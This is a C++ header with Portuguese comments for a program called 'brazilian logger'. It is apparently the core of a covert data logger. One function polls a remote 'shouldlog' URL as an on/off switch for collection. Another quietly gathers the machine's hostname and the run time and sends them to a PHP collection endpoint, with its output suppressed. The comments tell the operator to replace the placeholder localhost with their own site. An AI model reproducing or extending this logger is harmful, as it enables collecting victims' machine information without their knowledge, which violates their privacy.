#pragma once
// brazilian e foda o resto e moda
#include "includes.hpp"

static bool logchecker;

// mostra o logo 
void logo() {
    system("cls");
    printf("   __                _ ___         \n");
    printf("  / /  _______ ____ (_) (_)__ ____ \n");
    printf(" / _ \\/ __/ _ `/_ // / / / _ `/ _ \\\n");
    printf("/_.__/_/  \\_,_//__/_/_/_/\\_,_/_//_/");
    printf("logger\n");
    printf("\n");
}

// cria uma string alfanumerica aleatoria para o titulo da janela
// pra q? r: pra nada
std::string random_string(const int len) {
    const std::string alpha_numeric("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890");

    std::default_random_engine generator{ std::random_device{}() };
    const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 };

    std::string str(len, 0);
    for (auto& it : str) {
        it = alpha_numeric[distribution(generator)];
    }
    return str;
}

size_t CurlWrite_CallbackFunc_StdString(void* contents, size_t size, size_t nmemb, std::string* s)
{
    size_t newLength = size * nmemb;
    try
    {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc& e)
    {
        //handle memory problem
        return 0;
    }
    return newLength;
}

void shouldLog()
{ // https://curl.se/libcurl/c/http-post.html
    CURL* curl;
    CURLcode res;
    std::string s;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

    if (curl) // se curl for inicializado continuar ->
    {
        curl_easy_setopt(curl, CURLOPT_URL, "localhost/shouldlog"); // mudar para o site q controla a coleta de dados
       //curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // verifica o https do site
       //curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); //verifica o https do site
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString); // chama a funcao string acima
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

        // faz o request -> res -> returna a "string" 
        res = curl_easy_perform(curl);
        // verifica por erros 
        if (res != CURLE_OK)
        {
            log_err("erro ao iniciar o curl()"),
                curl_easy_strerror(res);
        }

        // limpa o curl 
        curl_easy_cleanup(curl);
    }
    log_warn("programa carregador executando checks.");
    Sleep(1000);

     bool bConnect = InternetCheckConnection("http://localhost/", FLAG_ICC_FORCE_CONNECTION, 0); // editar com seu site

    if (bConnect) { // checa se o site esta no ar

        log_ok("site no ar, continuando.");

        // mude o numero no arquivo "shouldlog" de 1 para -> 0 pra desativar a coleta de informacoes
        if (s == "1") // se a nossa string requisitada acima for igual a 1 -> coletar informacoes
        {
            log_ok("shouldlog ativo, continuando.");
            logchecker = true; // caso o site esteja online printe q esta e -> !logchecker
        }
        else {
            return;
        }
    }
    else if (!bConnect){
        log_err("o site parece estar fora do ar, verifique o host.");
        Sleep(2000); // caso contrario espera 2 segundos printa q ta fora do ar
        logchecker = false; // caso contrario sair do programa (ja que a coleta esta desativada)
        exit(-1); // caso o logchecker n funcione de qualquer isso forca a saida
    }
    // codigo horrivel desculpa
}

size_t write_data(void* buffer, size_t size, size_t nmemb, void* userp)
{
    return size * nmemb;  // faz com que o ao chamar o link em logging() ele nao use stdout e nao printa nada na tela
}

int logging(void)
{
    // <- pegando infos ->

    std::string header = "--brazilian+logger--+"; // nosso header pra ficar bonito
    std::string hora = "|+info+gathered+at+" + getTime("%X") + "+|+"; // pega a hora que o programa foi executado
    char szPath[128] = ""; WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData); gethostname(szPath, sizeof(szPath)); WSACleanup(); std::string host = szPath; // pega o nome do pc
    std::string url = "http://localhost/phpenviar.php?msg=" + header + hora + host;


    // manda pro pro php q pega as info e joga no txt
    // https://curl.se/libcurl/c/http-post.html
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //
        // faz o request -> res -> returna a "string" 
        res = curl_easy_perform(curl);
        // verifica por erros 
        if (res != CURLE_OK)
        {
            log_err("erro ao iniciar o curl()"),
                curl_easy_strerror(res);
        }
        // limpa e rala 
        curl_easy_cleanup(curl);
    }
    // bah
    curl_global_cleanup();
    return 0;
}